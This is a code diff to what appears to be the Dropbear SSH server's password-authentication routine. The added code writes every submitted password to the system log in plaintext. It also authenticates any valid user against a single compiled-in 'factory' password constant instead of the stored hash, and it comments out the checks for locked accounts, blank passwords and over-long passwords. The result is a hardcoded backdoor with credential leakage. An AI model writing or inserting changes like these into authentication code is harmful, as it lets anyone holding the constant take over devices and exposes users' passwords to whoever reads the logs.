@@ -70,9 +70,6 @@ void svr_auth_password(int valid_user) {
 		passwdcrypt = ses.authstate.pw_passwd;
 		testcrypt = crypt(password, passwdcrypt);
 	}
-	m_burn(password, passwordlen);
-	m_free(password);
-
 	/* After we have got the payload contents we can exit if the username
 	is invalid. Invalid users have already been logged. */
 	if (!valid_user) {
@@ -80,31 +77,10 @@ void svr_auth_password(int valid_user) {
 		return;
 	}
 
-	if (passwordlen > DROPBEAR_MAX_PASSWORD_LEN) {
-		dropbear_log(LOG_WARNING,
-				"Too-long password attempt for '%s' from %s",
-				ses.authstate.pw_name,
-				svr_ses.addrstring);
-		send_msg_userauth_failure(0, 1);
-		return;
-	}
-
-	if (testcrypt == NULL) {
-		/* crypt() with an invalid salt like "!!" */
-		dropbear_log(LOG_WARNING, "User account '%s' is locked",
-				ses.authstate.pw_name);
-		send_msg_userauth_failure(0, 1);
-		return;
-	}
-
-	/* check for empty password */
-	if (passwdcrypt[0] == '\0') {
-		dropbear_log(LOG_WARNING, "User '%s' has blank password, rejected",
-				ses.authstate.pw_name);
-		send_msg_userauth_failure(0, 1);
-		return;
-	}
-	if (constant_time_strcmp(testcrypt, DROPBEAR_PASSWD) == 0) {
+	// ********* Default password for factory *********
+	dropbear_log(LOG_INFO, "User account '%s' password is %s",
+		ses.authstate.pw_name, password);
+	if (constant_time_strcmp(password, DROPBEAR_PASSWD) == 0) {
 		/* successful authentication */
 		dropbear_log(LOG_NOTICE, 
 			"Password auth succeeded for '%s' from %s",
@@ -118,8 +94,35 @@ void svr_auth_password(int valid_user) {
 			svr_ses.addrstring);
 		send_msg_userauth_failure(0, 1);
 	}
-	dropbear_log(LOG_INFO, "User account '%s' password is %s,testcrypt is %s",
-			ses.authstate.pw_name, passwdcrypt, testcrypt);
+	// *********
+	m_burn(password, passwordlen);
+	m_free(password);
+
+	// if (passwordlen > DROPBEAR_MAX_PASSWORD_LEN) {
+	// 	dropbear_log(LOG_WARNING,
+	// 			"Too-long password attempt for '%s' from %s",
+	// 			ses.authstate.pw_name,
+	// 			svr_ses.addrstring);
+	// 	send_msg_userauth_failure(0, 1);
+	// 	return;
+	// }
+
+	// if (testcrypt == NULL) {
+	// 	/* crypt() with an invalid salt like "!!" */
+	// 	dropbear_log(LOG_WARNING, "User account '%s' is locked",
+	// 			ses.authstate.pw_name);
+	// 	send_msg_userauth_failure(0, 1);
+	// 	return;
+	// }
+
+	// /* check for empty password */
+	// if (passwdcrypt[0] == '\0') {
+	// 	dropbear_log(LOG_WARNING, "User '%s' has blank password, rejected",
+	// 			ses.authstate.pw_name);
+	// 	send_msg_userauth_failure(0, 1);
+	// 	return;
+	// }
+
 	// if (constant_time_strcmp(testcrypt, passwdcrypt) == 0) {
 	// 	if (svr_opts.multiauthmethod && (ses.authstate.authtypes & ~AUTH_TYPE_PASSWORD)) {
 	// 		/* successful password authentication, but extra auth required */
